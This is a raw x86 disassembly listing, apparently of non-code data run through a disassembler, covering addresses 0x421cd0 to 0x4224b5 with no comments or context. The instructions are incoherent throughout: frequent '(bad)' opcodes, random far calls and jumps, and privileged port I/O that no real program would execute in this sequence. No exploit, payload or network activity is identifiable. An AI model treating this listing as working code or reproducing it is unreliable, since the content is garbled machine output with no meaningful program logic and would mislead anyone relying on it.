  421cd0:	sub    ch,BYTE PTR [eax]
  421cd2:	push   es
  421cd3:	(bad)  
  421cd4:	(bad)  
  421cd5:	mov    ch,0x2
  421cd7:	lock jmp 0x421cc5
  421cda:	adc    ebx,DWORD PTR [ebx-0x7b]
  421cdd:	test   eax,0x244307f4
  421ce2:	lds    ebx,FWORD PTR [eax-0x3e]
  421ce5:	shr    BYTE PTR [eax],0x92
  421ce8:	adc    DWORD PTR [edi-0x45],ecx
  421ceb:	lock xor eax,0x53fcb207
  421cf1:	push   0x5
  421cf3:	or     BYTE PTR [ebp-0x40],0x10
  421cf7:	sub    bh,BYTE PTR [ebp-0x5c99bcd9]
  421cfd:	xor    DWORD PTR [ebx+edx*2],0x4a
  421d01:	sbb    esi,0x9
  421d04:	mov    esp,DWORD PTR ds:0x7e5d6c02
  421d0a:	loopne 0x421d61
  421d0c:	push   eax
  421d0d:	aad    0xfa
  421d0f:	mov    esi,0xe41a7217
  421d14:	sbb    BYTE PTR [ebx+edx*1-0x4d],0x7
  421d19:	xchg   edi,eax
  421d1a:	lods   eax,DWORD PTR ds:[esi]
  421d1b:	jno    0x421caf
  421d1d:	adc    al,0x94
  421d1f:	xchg   esi,eax
  421d20:	sub    ch,BYTE PTR ds:0xf191976e
  421d26:	jecxz  0x421d48
  421d28:	mov    bl,0xa
  421d2a:	ret    
  421d2b:	push   es
  421d2c:	mov    edx,0x731dffcd
  421d31:	and    DWORD PTR [edi],edi
  421d33:	xor    cl,bh
  421d35:	dec    ebp
  421d36:	gs push ebp
  421d38:	fwait
  421d39:	sub    DWORD PTR [edi],edi
  421d3b:	push   edx
  421d3c:	sysexit 
  421d3e:	imul   esp,DWORD PTR [esi],0x60
  421d41:	in     al,dx
  421d42:	pop    edx
  421d43:	popf   
  421d44:	pop    ebx
  421d45:	fcomip st,st(2)
  421d47:	or     al,bl
  421d49:	push   edx
  421d4a:	inc    esi
  421d4b:	dec    esi
  421d4c:	aam    0x5e
  421d4e:	and    DWORD PTR [esi+edx*8-0x8497a9a],esi
  421d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d56:	adc    eax,0xc87fbc22
  421d5b:	fadd   DWORD PTR [ebx-0x664bc1d9]
  421d61:	jl     0x421d6d
  421d63:	retf   
  421d64:	mov    ah,0x3c
  421d66:	psubsw mm0,QWORD PTR [edi+0x7c4e12be]
  421d6d:	ret    
  421d6e:	out    0x2,eax
  421d70:	dec    ebx
  421d71:	dec    edi
  421d72:	mov    ecx,0xcd91899d
  421d77:	ss test al,0x55
  421d7a:	sbb    al,0x2
  421d7c:	and    ah,0xc4
  421d7f:	rol    DWORD PTR [ecx-0x61299acb],0x58
  421d86:	push   ds
  421d87:	ins    BYTE PTR es:[edi],dx
  421d88:	fdivr  st,st(4)
  421d8a:	out    0x9e,al
  421d8c:	nop
  421d8d:	not    ebx
  421d8f:	cdq    
  421d90:	mov    ch,0xc7
  421d92:	sbb    bl,BYTE PTR [esi+0xa]
  421d95:	stc    
  421d96:	xchg   ebx,eax
  421d97:	fdiv   QWORD PTR [edx+0x5b921054]
  421d9d:	jne    0x421dbf
  421d9f:	(bad)  
  421da0:	inc    ebx
  421da1:	jno    0xd18c4b24
  421da7:	inc    edx
  421da8:	inc    ecx
  421da9:	cdq    
  421daa:	mov    ah,0xa8
  421dac:	shl    ebx,0xc3
  421daf:	xor    dh,BYTE PTR [edx-0x43e52ee5]
  421db5:	jmp    0xc8d9:0x62437053
  421dbc:	daa    
  421dbd:	lds    ecx,FWORD PTR [eax-0x25]
  421dc0:	ds push edi
  421dc2:	cmp    DWORD PTR ds:0x14499cb1,ebp
  421dc8:	sub    al,0xa2
  421dca:	jnp    0x421e12
  421dcc:	test   DWORD PTR [edi],edi
  421dce:	das    
  421dcf:	sbb    DWORD PTR [ecx-0x25],0x1a7549a
  421dd6:	out    dx,eax
  421dd7:	out    0x73,al
  421dd9:	sbb    ch,BYTE PTR [ebx+0x7b347e96]
  421ddf:	call   0x7056019e
  421de4:	pop    esi
  421de5:	mov    cl,0x9c
  421de7:	in     al,dx
  421de8:	xchg   edx,eax
  421de9:	sub    ecx,DWORD PTR [ebx+0x1782a8db]
  421def:	add    ebp,ecx
  421df1:	mov    DWORD PTR [eax+0x9],eax
  421df4:	inc    eax
  421df5:	inc    eax
  421df6:	pop    ecx
  421df7:	xlat   BYTE PTR ds:[ebx]
  421df8:	sti    
  421df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dfa:	outs   dx,DWORD PTR ds:[esi]
  421dfb:	std    
  421dfc:	bound  esp,QWORD PTR [ebx-0x64ce365b]
  421e02:	leave  
  421e03:	pop    ecx
  421e04:	xchg   BYTE PTR [esp+eiz*8+0x69],dh
  421e08:	pop    edi
  421e09:	aad    0xe0
  421e0b:	pushf  
  421e0c:	aad    0x4a
  421e0e:	fwait
  421e0f:	jne    0x421dd4
  421e11:	xor    edx,DWORD PTR [ecx+0x386d9559]
  421e17:	mov    dl,BYTE PTR [esp+edx*1]
  421e1a:	mov    al,0xb8
  421e1c:	imul   ebx,DWORD PTR [eax+0xe],0x2e4e1aca
  421e23:	cs jp  0x421e3f
  421e26:	add    DWORD PTR [esi-0x40106e71],0x9620ef4
  421e30:	lods   al,BYTE PTR ds:[esi]
  421e31:	daa    
  421e32:	mov    bh,0x3c
  421e34:	jge    0x421e6b
  421e36:	pusha  
  421e37:	or     esp,DWORD PTR [esi+0x607f2ac0]
  421e3d:	popa   
  421e3e:	pushf  
  421e3f:	cmp    BYTE PTR [edx],al
  421e41:	cmp    BYTE PTR [edx-0x25],dl
  421e44:	add    DWORD PTR [eax+eiz*8+0x49],esp
  421e48:	jecxz  0x421e90
  421e4a:	in     al,0x3c
  421e4c:	inc    ebx
  421e4d:	repnz (bad) 
  421e4f:	popa   
  421e50:	cli    
  421e51:	(bad)  
  421e52:	repnz mov bh,0xa6
  421e55:	stos   DWORD PTR es:[di],eax
  421e57:	sub    eax,DWORD PTR ss:[ecx+0x953867a]
  421e5e:	test   BYTE PTR [ecx-0x5e],dl
  421e61:	add    esp,ebx
  421e63:	xor    eax,DWORD PTR [eax-0x2f]
  421e66:	hlt    
  421e67:	push   eax
  421e68:	jp     0x421e76
  421e6a:	push   esi
  421e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e6c:	sub    esp,esp
  421e6e:	push   0xffffffcb
  421e70:	push   ebx
  421e71:	cmc    
  421e72:	sub    DWORD PTR [ebx+0x3e0be75d],edx
  421e78:	fimul  DWORD PTR [ebp+edi*1+0x272416b2]
  421e7f:	into   
  421e80:	retf   0x8e41
  421e83:	out    0xa8,al
  421e85:	loope  0x421eb0
  421e87:	and    BYTE PTR [ebx-0x8df61a4],bh
  421e8d:	call   0xf7f7:0x7912f992
  421e94:	pushf  
  421e95:	inc    dl
  421e97:	(bad)  
  421e98:	call   0xd72e:0xee78c708
  421e9f:	and    BYTE PTR [edx+ebx*2+0x1b908017],ah
  421ea6:	or     BYTE PTR [ecx+ecx*2+0x68a0826d],bl
  421ead:	xchg   BYTE PTR [ebx],dl
  421eaf:	pop    DWORD PTR [ebx+0x5db6de79]
  421eb5:	call   0x82ff:0xd35246cf
  421ebc:	das    
  421ebd:	cdq    
  421ebe:	xor    DWORD PTR [esi],edx
  421ec0:	sbb    al,0x5c
  421ec2:	xor    DWORD PTR [esi-0x1a405d63],edi
  421ec8:	jge    0x421eda
  421eca:	adc    ebp,edi
  421ecc:	jge    0x421f3f
  421ece:	or     al,0xba
  421ed1:	push   edx
  421ed2:	setbe  al
  421ed5:	icebp  
  421ed6:	jne    0x421ed7
  421ed8:	cmp    bl,bh
  421eda:	pop    esp
  421edb:	mov    ebx,0xeac5efc4
  421ee0:	into   
  421ee1:	sbb    al,0x11
  421ee3:	leave  
  421ee4:	aaa    
  421ee5:	jno    0x421f08
  421ee7:	mov    edi,0xe1a11d77
  421eec:	fsubr  DWORD PTR [esi+eax*2-0x77]
  421ef0:	push   es
  421ef1:	call   0x417a26f2
  421ef6:	and    esp,ebx
  421ef8:	add    BYTE PTR [esi],ah
  421efa:	inc    eax
  421efb:	mov    dh,0x2a
  421efd:	mov    ebx,0xf406d2ec
  421f02:	(bad)  
  421f04:	mov    cs,esp
  421f06:	arpl   WORD PTR [ebx-0x59],sp
  421f09:	out    dx,al
  421f0a:	ret    
  421f0b:	gs inc eax
  421f0d:	dec    edx
  421f0e:	cs dec eax
  421f10:	xor    al,0x2
  421f12:	pop    edx
  421f13:	mov    BYTE PTR [eax+0x5e],ch
  421f16:	push   0xffffffb3
  421f18:	call   0x2faa:0x331e6596
  421f1f:	dec    edx
  421f20:	xchg   esi,eax
  421f21:	gs cmp ebp,ebx
  421f24:	xchg   esi,eax
  421f25:	mov    edi,DWORD PTR [edx]
  421f27:	cmp    al,0x12
  421f29:	fwait
  421f2a:	int3   
  421f2b:	ins    DWORD PTR es:[edi],dx
  421f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f2d:	xor    esi,ecx
  421f2f:	cld    
  421f30:	adc    DWORD PTR [ebx],ecx
  421f32:	loope  0x421f21
  421f34:	loop   0x421f21
  421f36:	sar    DWORD PTR [ecx],cl
  421f38:	xchg   esi,eax
  421f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f3a:	loopne 0x421f1c
  421f3c:	int    0xf
  421f3e:	cmp    eax,0x751e0d4e
  421f43:	(bad)  
  421f44:	ins    BYTE PTR es:[edi],dx
  421f45:	fcom   QWORD PTR [esi-0x1c9436a4]
  421f4b:	imul   ebp,ecx,0x49307090
  421f51:	xor    WORD PTR ss:[eax+0x28],0x39
  421f57:	aam    0xe5
  421f59:	adc    esp,eax
  421f5b:	xchg   edx,eax
  421f5c:	mov    DWORD PTR [ebx+edx*4-0x5a],eax
  421f60:	out    0x8f,al
  421f62:	call   DWORD PTR [edi-0x5cdc3169]
  421f68:	ins    BYTE PTR es:[edi],dx
  421f69:	aas    
  421f6a:	adc    BYTE PTR [ecx],cl
  421f6c:	push   0x801baaca
  421f71:	mov    ch,0xa5
  421f73:	test   al,0x65
  421f75:	repnz xor al,0xd
  421f78:	mov    ecx,0x83504348
  421f7d:	inc    esp
  421f7e:	or     edi,DWORD PTR [ebx+eiz*2]
  421f81:	lods   eax,DWORD PTR ds:[esi]
  421f83:	fld    TBYTE PTR [ebx+0x3c]
  421f86:	mov    ch,0xd1
  421f88:	rcl    BYTE PTR [eax],0x71
  421f8b:	ja     0x421f14
  421f8d:	add    ebp,DWORD PTR [eax]
  421f8f:	popf   
  421f90:	out    dx,al
  421f91:	or     ah,BYTE PTR [esi+0x71e74554]
  421f97:	scas   eax,DWORD PTR es:[edi]
  421f98:	neg    DWORD PTR [ecx+0x7fd45ef7]
  421f9e:	jno    0x421f47
  421fa0:	inc    ebx
  421fa1:	dec    edx
  421fa2:	pop    eax
  421fa3:	xchg   ebx,eax
  421fa4:	pop    ss
  421fa5:	mov    eax,ds:0x69f2159c
  421faa:	fnstcw WORD PTR [ebp+0x70]
  421fad:	ret    
  421fae:	pushf  
  421faf:	and    ecx,edx
  421fb1:	add    DWORD PTR [ecx-0x26a5ed9f],ebp
  421fb7:	mov    ebx,0xaa99ed28
  421fbc:	arpl   WORD PTR [eax-0x30],dx
  421fbf:	out    dx,eax
  421fc0:	adc    ch,BYTE PTR [edi]
  421fc2:	add    eax,0x9396bc71
  421fc7:	repz pop ds
  421fc9:	mov    DWORD PTR [edx+0x6942a6be],ebx
  421fcf:	imul   ecx,DWORD PTR [ebx-0x7cfc8875],0xffffffde
  421fd6:	bound  ebp,QWORD PTR [edx+0x148dc2fd]
  421fdc:	xchg   ebx,eax
  421fdd:	mov    ecx,0x83dd2095
  421fe2:	test   al,0x30
  421fe4:	push   ss
  421fe5:	mov    gs,eax
  421fe7:	nop
  421fe8:	or     DWORD PTR [ebp+0x71],edi
  421feb:	and    eax,0xc7ad9b46
  421ff0:	mov    al,0xcf
  421ff2:	out    0x9e,eax
  421ff4:	sbb    ebp,DWORD PTR [ebx+0x3d4cd97f]
  421ffa:	push   0xffffffab
  421ffc:	les    ebx,FWORD PTR [ebx+edx*2+0x7fef96b]
  422003:	not    DWORD PTR [ebp+0x3e9816e3]
  422009:	or     al,0xc6
  42200b:	addr16 mov bl,0x5e
  42200e:	std    
  42200f:	or     ecx,esi
  422011:	pop    esp
  422012:	shl    esi,1
  422014:	daa    
  422015:	and    al,0x20
  422017:	sti    
  422018:	je     0x421f9e
  42201a:	inc    eax
  42201b:	jno    0x42206d
  42201d:	or     eax,0x373619f3
  422022:	and    edi,DWORD PTR [ebx]
  422024:	loop   0x421fdc
  422026:	mov    esi,0x9d60ca27
  42202b:	std    
  42202c:	xor    DWORD PTR [ebx-0x30ab1dac],ecx
  422032:	cwde   
  422033:	xchg   ebx,eax
  422034:	xchg   ebx,edx
  422036:	(bad)
  422039:	js     0x421fcf
  42203b:	sbb    esp,ebp
  42203d:	mov    WORD PTR [edx+0x1e168bb5],es
  422043:	dec    esp
  422044:	push   ds
  422045:	jnp    0x422063
  422047:	aaa    
  422048:	or     DWORD PTR [edx-0x569e7395],esp
  42204e:	(bad)  
  42204f:	jns    0x422072
  422051:	inc    esp
  422052:	popf   
  422053:	mov    ds:0x29d05b16,eax
  422058:	jae    0x422003
  42205a:	shr    ah,1
  42205c:	or     ch,BYTE PTR [edi]
  42205e:	pop    ebp
  42205f:	ja     0x422021
  422061:	cmp    DWORD PTR [edi],esp
  422063:	sbb    BYTE PTR [esi],ch
  422065:	inc    edx
  422066:	pushf  
  422067:	rcl    BYTE PTR [edx+ecx*2-0x3c],1
  42206b:	sbb    dl,BYTE PTR [edx+0x65]
  42206e:	dec    esi
  42206f:	add    ah,bh
  422071:	(bad)  [esi-0xd]
  422074:	in     eax,0xfe
  422076:	stc    
  422077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422078:	cmp    DWORD PTR [ebp+0x5e],0x1a45142e
  42207f:	adc    bl,0x27
  422082:	lock cmc 
  422084:	jno    0x4220ef
  422086:	scas   al,BYTE PTR es:[edi]
  422087:	mov    BYTE PTR [ebx+0x74],0x22
  42208b:	sbb    edx,esi
  42208d:	popf   
  42208e:	jb     0x422065
  422090:	adc    BYTE PTR [esi+0x43],bh
  422093:	fwait
  422094:	pop    edi
  422095:	loop   0x42207c
  422097:	xchg   cx,ax
  422099:	jg     0x422068
  42209b:	ss mov DWORD PTR cs:[ecx],eax
  42209f:	in     eax,dx
  4220a0:	int    0xed
  4220a2:	iret   
  4220a3:	sbb    ah,BYTE PTR [edi+0x5e]
  4220a6:	mov    ah,0xab
  4220a8:	jae    0x4220eb
  4220aa:	cs mov ah,0xd6
  4220ad:	jbe    0x422120
  4220af:	cmp    DWORD PTR ds:0x1646a34e,ecx
  4220b5:	(bad)  
  4220b6:	rcl    BYTE PTR [ebx+0x297f6cc4],0xbc
  4220bd:	in     eax,0x36
  4220bf:	js     0x4220f3
  4220c1:	pusha  
  4220c2:	sub    al,0xbf
  4220c4:	icebp  
  4220c5:	pusha  
  4220c6:	inc    edi
  4220c7:	pop    es
  4220c8:	xchg   ebp,eax
  4220c9:	rol    bl,0x55
  4220cc:	jmp    0x28233dd
  4220d1:	xchg   ebx,eax
  4220d2:	pop    edi
  4220d3:	sti    
  4220d4:	aaa    
  4220d5:	outs   dx,DWORD PTR ds:[esi]
  4220d6:	in     al,dx
  4220d7:	(bad)  
  4220d9:	mov    eax,ds:0x37bbb812
  4220de:	add    al,0x8a
  4220e0:	test   eax,0x3820fdd3
  4220e5:	sbb    DWORD PTR [ecx-0x4],esp
  4220e8:	mov    cl,bh
  4220ea:	(bad)  
  4220eb:	jl     0x4220f6
  4220ed:	in     al,0x1e
  4220ef:	jmp    DWORD PTR [ebx]
  4220f1:	test   dl,0x83
  4220f4:	ins    BYTE PTR es:[edi],dx
  4220f5:	mov    eax,ds:0xfc37c040
  4220fa:	popf   
  4220fb:	mov    edi,0xe6a7f266
  422100:	in     al,dx
  422101:	fmul   QWORD PTR [edx+0x2b]
  422104:	retf   
  422105:	cmc    
  422106:	pop    esp
  422107:	mov    WORD PTR [edx],?
  422109:	fldcw  WORD PTR [ebx+edx*2-0x1f]
  42210e:	inc    ebp
  42210f:	frstor [ebx+0x1]
  422112:	jae    0x422190
  422114:	jg     0x4220cc
  422116:	or     ch,BYTE PTR [edi+0x6456f0fb]
  42211c:	iret   
  42211d:	out    dx,eax
  42211e:	int    0xea
  422120:	(bad)  
  422121:	lock and al,0xa0
  422124:	cmp    esi,DWORD PTR [edi+0x56626cf5]
  42212a:	xor    al,0x28
  42212c:	into   
  42212d:	sbb    eax,0xca472f29
  422132:	ins    BYTE PTR es:[edi],dx
  422133:	adc    eax,eax
  422135:	sub    eax,0xfec95b8a
  42213a:	mov    dh,0xd6
  42213c:	out    0x92,al
  42213e:	fnstcw WORD PTR [eax-0xcb2a794]
  422144:	frstor [esi-0x6bc2a314]
  42214a:	sti    
  42214b:	adc    DWORD PTR es:[edx],esi
  42214e:	pop    ecx
  42214f:	and    DWORD PTR [ecx+0x6e4ec287],edx
  422155:	enter  0xf521,0xe1
  422159:	inc    ebx
  42215a:	xor    al,0xfa
  42215c:	inc    ecx
  42215d:	ds mov edx,0xf7b2ef68
  422163:	das    
  422164:	inc    ch
  422166:	int3   
  422167:	and    al,0xf8
  422169:	data16 ja 0x4221c8
  42216c:	cli    
  42216d:	test   eax,0x431d9a82
  422172:	ret    
  422173:	adc    eax,DWORD PTR [edx]
  422175:	mov    al,0x16
  422177:	js     0x42210a
  422179:	shl    DWORD PTR [esi],1
  42217b:	popf   
  42217c:	out    dx,eax
  42217d:	hlt    
  42217e:	and    eax,0x861f699
  422183:	inc    edi
  422184:	ja     0x4221b4
  422186:	dec    ecx
  422187:	mov    cs,esi
  422189:	jae    0x42216a
  42218b:	xchg   ebx,eax
  42218c:	ja     0x422122
  42218e:	nop
  42218f:	mov    eax,0x98b636df
  422194:	push   ds
  422195:	or     ch,dh
  422197:	outs   dx,DWORD PTR ds:[esi]
  422198:	inc    ebp
  422199:	mov    ah,0xf5
  42219b:	pusha  
  42219c:	je     0x422131
  42219e:	aad    0x1e
  4221a0:	lahf   
  4221a1:	shl    BYTE PTR [edx],1
  4221a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221a4:	jns    0x42219f
  4221a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221a7:	adc    DWORD PTR es:[ebp-0x40cfa474],ebx
  4221ae:	out    0xf7,eax
  4221b0:	test   al,0x84
  4221b2:	das    
  4221b3:	dec    edi
  4221b4:	(bad)  
  4221b6:	in     eax,dx
  4221b7:	cmp    BYTE PTR [esi-0x60e7beb8],cl
  4221bd:	mov    DWORD PTR [edi-0x761c36eb],ecx
  4221c3:	popa   
  4221c4:	(bad)  
  4221c5:	jo     0x42214a
  4221c7:	jne    0x4221be
  4221c9:	cmp    al,0x53
  4221cb:	in     al,0x7d
  4221cd:	jno    0x4221e1
  4221cf:	or     DWORD PTR [ecx-0x61420206],edi
  4221d5:	sbb    BYTE PTR [ecx],0x94
  4221d8:	jle    0x422166
  4221da:	jl     0x4221aa
  4221dc:	jbe    0x4221ef
  4221de:	jbe    0x42219a
  4221e0:	push   ss
  4221e1:	sub    esp,ebx
  4221e3:	and    bl,bh
  4221e5:	push   eax
  4221e6:	mov    ecx,0xe15dbeb5
  4221eb:	ja     0x4221c0
  4221ed:	and    al,0x2
  4221ef:	hlt    
  4221f0:	pop    ds
  4221f1:	inc    eax
  4221f2:	xchg   ecx,eax
  4221f3:	ss mov edi,0xa10ec4b6
  4221f9:	rcr    DWORD PTR [edi-0x7a],0xe8
  4221fd:	ficomp WORD PTR [ebx+0x4]
  422200:	push   eax
  422201:	sub    dl,BYTE PTR [edx]
  422203:	imul   edi,ebp,0xffffffff
  422206:	cmc    
  422207:	cmp    esi,DWORD PTR [esi]
  422209:	int3   
  42220a:	mov    ds:0x6835f712,al
  42220f:	mov    ch,0x30
  422211:	pop    esi
  422212:	add    dl,BYTE PTR [edx+0x41]
  422215:	add    BYTE PTR [ecx],ch
  422217:	fs xor eax,0x3b99bf0e
  42221d:	cdq    
  42221e:	fucomi st,st(2)
  422220:	adc    al,0x24
  422222:	or     DWORD PTR [edi-0x7a],ecx
  422225:	mov    edx,0x3a7549d1
  42222a:	cmp    esi,DWORD PTR [eax+0x4d]
  42222d:	xor    al,0xcc
  42222f:	retf   
  422230:	sbb    ecx,DWORD PTR [ebx]
  422232:	mov    eax,0x18da7eac
  422237:	sbb    BYTE PTR [ebx],dl
  422239:	inc    ebp
  42223a:	mov    ds:0x83288899,eax
  42223f:	and    BYTE PTR [eax+0x5a],0xe3
  422243:	out    0x1e,eax
  422245:	ret    0xcbca
  422248:	sti    
  422249:	mov    ebx,0xd208f8b2
  42224e:	fidiv  WORD PTR [edi]
  422250:	retf   0xd34e
  422253:	out    dx,eax
  422254:	cmp    eax,0x7edd5980
  422259:	pop    eax
  42225a:	ja     0x4222d5
  42225c:	mov    cl,0xa6
  42225e:	add    eax,0xeb1561
  422263:	(bad)  
  422264:	xchg   ebx,eax
  422265:	push   ss
  422266:	and    DWORD PTR [eax+0x62],edi
  422269:	sub    BYTE PTR [edi],dl
  42226b:	lds    esp,FWORD PTR [eax-0x51e0cb22]
  422271:	inc    ebp
  422272:	test   DWORD PTR [esi+0x3c11ae7f],esi
  422278:	dec    ebp
  422279:	mov    WORD PTR [eax-0x59],es
  42227c:	hlt    
  42227d:	mov    ch,0x91
  42227f:	mov    WORD PTR ds:0x5de9745,fs
  422285:	jno    0x42225b
  422287:	dec    esp
  422288:	repnz lds esi,FWORD PTR [ebx+0x7dc5dce8]
  42228f:	inc    eax
  422290:	xor    BYTE PTR [edx],bl
  422292:	push   edx
  422293:	mov    eax,0xe1d332b4
  422298:	sbb    dl,BYTE PTR [esi]
  42229a:	aaa    
  42229b:	imul   edi,DWORD PTR [esp-0x66],0x59
  4222a0:	mov    edx,0xccc501b3
  4222a5:	or     bh,0x99
  4222a8:	pop    esp
  4222a9:	lds    edi,FWORD PTR ds:[edi-0x2a]
  4222ad:	jo     0x42226c
  4222af:	sub    cl,BYTE PTR [ecx+ecx*4]
  4222b2:	mov    bh,0xdd
  4222b4:	pop    eax
  4222b5:	rol    eax,0xc8
  4222b8:	xor    bh,0xa9
  4222bb:	in     al,dx
  4222bc:	pushf  
  4222bd:	jmp    0xbe34:0x2027a49e
  4222c4:	xor    dh,BYTE PTR [eax+0x2065aae0]
  4222ca:	mov    ebp,0xd6d37847
  4222cf:	inc    ebx
  4222d0:	jge    0x4222e3
  4222d2:	ret    0x3db1
  4222d5:	sbb    al,0x5d
  4222d7:	jne    0x4222e8
  4222d9:	xchg   DWORD PTR [esi+eiz*8],esi
  4222dc:	loop   0x42227b
  4222de:	add    eax,0xf9432a14
  4222e3:	or     dh,al
  4222e5:	add    cl,BYTE PTR [ebp+0x45]
  4222e8:	hlt    
  4222e9:	cmp    al,0xc
  4222eb:	pop    eax
  4222ec:	mov    eax,ds:0x836ec923
  4222f1:	inc    ecx
  4222f2:	scas   eax,DWORD PTR es:[edi]
  4222f3:	in     al,0xf
  4222f5:	or     eax,0x43c96fbd
  4222fa:	retf   0x77e3
  4222fd:	xor    DWORD PTR [ebx-0x5f],ebx
  422300:	dec    ebx
  422301:	mov    edx,0x73c871a8
  422306:	dec    esp
  422307:	jecxz  0x422371
  422309:	xchg   esi,eax
  42230a:	mov    WORD PTR [ecx-0x7e389088],es
  422310:	push   esi
  422311:	imul   eax,DWORD PTR [esi],0xf69d49d9
  422317:	mov    DWORD PTR [ebx-0x503a120d],ebx
  42231d:	lock loop 0x42237f
  422320:	adc    DWORD PTR [esp+ebx*2],eax
  422323:	shl    DWORD PTR [ebx],cl
  422325:	call   0xdbf5:0xd6a67f9f
  42232c:	inc    ebp
  42232d:	fistp  QWORD PTR [edx]
  42232f:	push   esi
  422330:	ja     0x4223a8
  422332:	(bad)  
  422333:	jno    0x42232c
  422335:	dec    eax
  422336:	sub    al,0x8
  422338:	mov    ebp,0x179329b8
  42233d:	(bad)  
  42233e:	fbstp  TBYTE PTR [edi+0x15edc0cb]
  422344:	inc    eax
  422345:	jg     0x422338
  422347:	mov    bh,0x4f
  422349:	shl    BYTE PTR [ebx],cl
  42234b:	les    esi,FWORD PTR [ebp-0x4f05e369]
  422351:	pop    esp
  422352:	lock hlt 
  422354:	shl    BYTE PTR [ebp-0x60aa7fab],1
  42235a:	xor    DWORD PTR [ebx-0x6d670b26],esp
  422360:	cdq    
  422361:	ja     0x4223e0
  422363:	mov    edi,edx
  422365:	leave  
  422366:	sar    ch,1
  422368:	pop    ebp
  422369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42236a:	xchg   esi,eax
  42236b:	mov    dh,0x95
  42236d:	cmp    eax,0x26af99ac
  422372:	lods   eax,DWORD PTR ds:[esi]
  422373:	mov    dl,0xb2
  422375:	aas    
  422376:	inc    esp
  422377:	mov    ecx,0x2761aae0
  42237c:	pop    esp
  42237d:	xor    esi,DWORD PTR [ebp-0x19d3db83]
  422383:	pop    edi
  422384:	inc    ebp
  422385:	cli    
  422386:	es cmp eax,0xc07e467f
  42238c:	popa   
  42238d:	sbb    ah,BYTE PTR [esi+edx*8]
  422390:	push   eax
  422391:	push   esp
  422392:	mov    WORD PTR ds:0xa1580d44,es
  422398:	call   0xc5c05ed1
  42239d:	push   ebx
  42239e:	dec    esp
  42239f:	cmp    al,0x52
  4223a1:	inc    esi
  4223a2:	mov    ds:0xd2ea54d8,al
  4223a7:	mov    ah,dl
  4223a9:	pop    esp
  4223aa:	out    0x3c,eax
  4223ac:	add    edi,esi
  4223ae:	mov    ds:0xfc63b261,eax
  4223b3:	sub    ecx,eax
  4223b5:	ss stc 
  4223b7:	sti    
  4223b8:	mov    ebx,DWORD PTR [esi-0x362f567e]
  4223be:	push   es
  4223bf:	mov    ebp,0x53f47c0d
  4223c4:	sbb    eax,0x71ceab44
  4223c9:	push   esp
  4223ca:	fiadd  WORD PTR [edi-0x5f]
  4223cd:	and    eax,0x1937687e
  4223d2:	push   ebx
  4223d3:	sub    DWORD PTR [edx],esp
  4223d5:	jns    0x4223a0
  4223d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d8:	ins    DWORD PTR es:[edi],dx
  4223d9:	xor    ebp,DWORD PTR [ebp-0x59]
  4223dc:	loope  0x422453
  4223de:	sub    eax,0x7174814c
  4223e3:	aaa    
  4223e4:	stos   BYTE PTR es:[edi],al
  4223e5:	scas   eax,DWORD PTR es:[edi]
  4223e6:	sub    ebx,edi
  4223e8:	sub    ch,BYTE PTR [ecx+eiz*2+0x3]
  4223ec:	cwde   
  4223ed:	push   cs
  4223ee:	push   ecx
  4223ef:	mov    esp,0xa4858df0
  4223f4:	aaa    
  4223f5:	js     0x4223ed
  4223f7:	out    0xc0,al
  4223f9:	(bad)  
  4223fa:	xchg   ebx,eax
  4223fb:	mov    BYTE PTR [ebx+0x6b8c602d],dl
  422401:	push   esi
  422402:	ss aas 
  422404:	pushf  
  422405:	or     BYTE PTR [edi-0x1d],bh
  422408:	adc    DWORD PTR [edx-0x12276952],ecx
  42240e:	daa    
  42240f:	popa   
  422410:	xor    esi,DWORD PTR [edx-0x7a]
  422413:	sbb    DWORD PTR [ecx+0x422ee47],esi
  422419:	mov    ch,0xbd
  42241b:	popa   
  42241c:	push   edi
  42241d:	mov    gs,WORD PTR [esi+0x8]
  422420:	sub    al,0xc8
  422422:	xor    al,0x86
  422424:	(bad)  
  422425:	adc    dh,BYTE PTR [ebx]
  422427:	ja     0x422478
  422429:	mov    ds:0x88b2a48f,eax
  42242e:	push   ebp
  42242f:	jl     0x4223ff
  422431:	enter  0xdcf,0xe5
  422435:	sub    eax,0x57a79836
  42243a:	arpl   dx,sp
  42243c:	xchg   ebx,eax
  42243d:	add    edx,DWORD PTR [edi+0x27]
  422440:	jge    0x4223f1
  422442:	pop    eax
  422443:	ret    0xa8ca
  422446:	xlat   BYTE PTR ds:[ebx]
  422447:	pop    esi
  422448:	jle    0x4224bc
  42244a:	push   esp
  42244b:	out    dx,eax
  42244c:	scas   al,BYTE PTR es:[edi]
  42244d:	and    cl,BYTE PTR [edx]
  42244f:	mov    eax,ds:0xb9618814
  422455:	popf   
  422456:	jg     0x422448
  422458:	cmp    BYTE PTR [ebx],cl
  42245a:	sub    DWORD PTR [ecx],0xa3f088cd
  422460:	je     0x422481
  422462:	fidiv  DWORD PTR [ebx+esi*8+0x772e8801]
  422469:	and    eax,DWORD PTR [esi]
  42246b:	ss into 
  42246d:	lea    ebp,[ecx-0x3e85c2de]
  422473:	(bad)  
  422474:	sbb    ecx,DWORD PTR [ebx+0x72]
  422477:	sbb    bl,ah
  422479:	push   esi
  42247a:	daa    
  42247b:	lds    ebp,FWORD PTR [ebx+ebp*1]
  42247e:	daa    
  42247f:	mov    ah,0x66
  422481:	pop    ecx
  422482:	mov    al,0x5e
  422484:	jns    0x42245c
  422486:	jb     0x422490
  422488:	cmp    al,0x95
  42248a:	(bad)  
  42248c:	in     eax,dx
  42248d:	adc    DWORD PTR [esi+0x2d7f32af],eax
  422493:	dec    esp
  422494:	push   0x19090f11
  422499:	pop    ebp
  42249b:	cmp    eax,0x91daa0e4
  4224a0:	and    DWORD PTR [edx],edi
  4224a2:	dec    edi
  4224a3:	mov    ds:0xeb6a2c8e,al
  4224a8:	push   ebp
  4224a9:	mov    dl,0xde
  4224ab:	test   al,0xd0
  4224ad:	mov    ebp,0x23597dda
  4224b2:	adc    BYTE PTR [ecx+0x7c],dl
  4224b5:	mov    ah,0x95
